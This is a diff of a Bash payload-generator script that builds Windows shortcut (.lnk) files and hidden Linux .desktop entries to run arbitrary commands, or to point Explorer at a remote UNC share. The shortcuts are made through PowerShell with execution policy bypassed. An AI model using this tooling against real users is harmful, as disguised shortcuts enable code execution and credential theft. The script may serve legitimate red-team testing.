@@ -104,6 +104,11 @@ function random_string() {
 
 function generate() {
     local payload="${1}"
+    local command="${COMMAND//\\/\\\\}"
+    local arguments="${ARGUMENTS//\\/\\\\}"
+    local name="${NAME//\\/\\\\}"
+    local description="${DESCRIPTION//\\/\\\\}"
+    local -a execute=()
 
     function shell_link() {
         local -A windowstyle=(
@@ -111,28 +116,27 @@ function generate() {
             [maximized]=3
             [minimized]=7
         )
-        local command="${COMMAND//\\/\\\\}"
         local temp
         local temporary_file
         local script
-        arguments=("WINEDEBUG=-all" "WINEARCH=win64"
+        execute=("WINEDEBUG=-all" "WINEARCH=win64"
                 "WINEPREFIX='${WINEPREFIX_DIRECTORY}'" "wine")
 
         script="\$WScriptShell = New-Object -ComObject WScript.Shell\n"
         script+="\$ShortcutPath = \"${OUTPUT}\"\n"
         script+="\$Shortcut = \$WScriptShell.CreateShortcut(\$ShortcutPath)\n"
 
-        if [[ -n "${COMMAND}" ]]
+        if [[ -n "${command}" ]]
         then
-            if [[ -n "${ARGUMENTS}" && "${#ARGUMENTS}" -lt 260 ]]
+            if [[ -n "${arguments}" && "${#arguments}" -lt 260 ]]
             then
                 script+="\$Shortcut.TargetPath = '${command}'\n"
-                script+="\$Shortcut.Arguments = '${ARGUMENTS}'\n"
-            elif (("${#ARGUMENTS}" >= 260))
+                script+="\$Shortcut.Arguments = '${arguments}'\n"
+            elif (("${#arguments}" >= 260))
             then
                 print "error" "Arguments must not exceed more than 260 characters"
                 quit 1
-            elif [[ -z "${ARGUMENTS}" ]]
+            elif [[ -z "${arguments}" ]]
             then
                 print "error" "Command and arguments must be passed!"
                 quit 1
@@ -174,19 +178,18 @@ function generate() {
                     unc="\\\\\\${IP}\\\\${SHARE},select,${NAME}"
                 fi
             fi
-            
+
             # Escape the escape character (\e)
             script+="\$Shortcut.TargetPath = 'C:\\Windows\\\\explorer.exe'\n"
             script+="\$Shortcut.Arguments = '/root,\"\\${unc}\"'\n"
-        
         else
             print "error" "You must provide either -c (command) or -i (IP) for 'lnk' payload."
             quit 1
         fi
 
-        if [[ -n "${DESCRIPTION}" ]]
+        if [[ -n "${description}" ]]
         then
-            script+="\$Shortcut.Description = \"${DESCRIPTION}\""
+            script+="\$Shortcut.Description = \"${description}\""
         fi
 
         # Using a custom index icon
@@ -218,90 +221,84 @@ function generate() {
         # Save the temporary PowerShell script then remove it after generation
         temporary_file=$(mktemp --suffix '.ps1')
         echo -e "${script}" > "${temporary_file}"
-        eval "${arguments[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
         rm -f "${temporary_file}"
 
         print "completed" "Payload has been generated!"
     }
 
     function desktop_entry() {
-        arguments=("desktop-file-edit")
+        execute=("desktop-file-edit")
 
-        if [[ -n "${NAME}" ]]
+        if [[ -n "${name}" ]]
         then
-            arguments+=("--set-key='Encoding'")
-            arguments+=("--set-value='UTF-8'")
-            arguments+=("--set-key='Name'")
-            arguments+=("--set-value='${NAME}'")
-            arguments+=("--set-key='Version'")
-            arguments+=("--set-value='1.0'")
+            execute+=("--set-key='Encoding'")
+            execute+=("--set-value='UTF-8'")
+            execute+=("--set-key='Name'")
+            execute+=("--set-value='${name}'")
+            execute+=("--set-key='Version'")
+            execute+=("--set-value='1.0'")
         else
             print "error" "Name must be passed!"
             quit 1
         fi
 
-        if [[ -n "${COMMAND}" && -n "${ARGUMENTS}" ]]
+        if [[ -n "${command}" && -n "${arguments}" ]]
         then
-            arguments+=("--set-key='Exec'")
-            arguments+=("--set-value='${COMMAND} ${ARGUMENTS}'")
-        elif [[ -n "${COMMAND}" ]]
+            execute+=("--set-key='Exec'")
+            execute+=("--set-value='${command} ${arguments}'")
+        elif [[ -n "${command}" ]]
         then
-            arguments+=("--set-key='Exec'")
-            arguments+=("--set-value='${COMMAND}'")
+            execute+=("--set-key='Exec'")
+            execute+=("--set-value='${command}'")
         else
             print "error" "At least command and/or arguments must be passed!"
             quit 1
         fi
 
-        if [[ -n "${DESCRIPTION}" ]]
+        if [[ -n "${description}" ]]
         then
-            arguments+=("--set-comment='${DESCRIPTION}'")
-        fi
-
-        if (( ${#ARGUMENTS} >= 260 ))
-        then
-            print "error" "Arguments must not exceed more than 260 characters"
-            quit 1
+            execute+=("--set-comment='${description}'")
         fi
 
         if [[ -n "${WORKINGDIRECTORY}" ]]
         then
-            arguments+=("--set-key='Path'")
-            arguments+=("--set-value='${WORKINGDIRECTORY}'")
+            execute+=("--set-key='Path'")
+            execute+=("--set-value='${WORKINGDIRECTORY}'")
         fi
 
         if [[ -n "${ICON}" ]]
         then
-            arguments+=("--set-icon='${ICON}'")
+            execute+=("--set-icon='${ICON}'")
         fi
 
         if [[ -z "${WINDOW}" ]]
         then
-            arguments+=("--set-key=\"Terminal\"")
-            arguments+=("--set-value=\"false\"")
+            execute+=("--set-key=\"Terminal\"")
+            execute+=("--set-value=\"false\"")
         elif [[ -n "${WINDOW}" ]] # Make the application run in terminal if set to true otherwise false
         then
             if [[ "${WINDOW}" == "true" || "${WINDOW}" == "false" ]]
             then
-                arguments+=("--set-key=\"Terminal\"")
-                arguments+=("--set-value=\"${WINDOW}\"")
+                execute+=("--set-key=\"Terminal\"")
+                execute+=("--set-value=\"${WINDOW}\"")
             else
                 print "error" "The Terminal must be set either 'true' or 'false'!"
             fi
         fi
-        arguments+=("--set-key=\"Type\"")
-        arguments+=("--set-value=\"Application\"")
+        execute+=("--set-key=\"Type\"")
+        execute+=("--set-value=\"Application\"")
         # Do not appear in application menu
-        arguments+=("--set-key=\"NoDisplay\"")
-        arguments+=("--set-value=\"true\"")
+        execute+=("--set-key=\"NoDisplay\"")
+        execute+=("--set-value=\"true\"")
         # The desktop entry must be usable and not hidden
-        arguments+=("--set-key=\"Hidden\"")
-        arguments+=("--set-value=\"false\"")
-        arguments+=("--remove-key=\"X-Desktop-File-Install-Version\"")
+        execute+=("--set-key=\"Hidden\"")
+        execute+=("--set-value=\"false\"")
+        execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
         touch "${OUTPUT}"
 
         print "completed" "Payload has been generated!"
-        eval "${arguments[*]} ${OUTPUT} &>/dev/null"
+        eval "${execute[*]} ${OUTPUT} &>/dev/null"
     }
 
     if [[ -f "${OUTPUT}" ]]
@@ -441,7 +438,7 @@ function main() {
     trap quit SIGINT
     check_dependencies
 
-    ((VERSION == 1)) && echo "${0} version: v1.1"
+    ((VERSION == 1)) && echo "${0} version: v1.2"
 
     # Require either -c or -i (but not both) for 'lnk' payloads
     if [[ "${PAYLOAD}" == "lnk" ]]
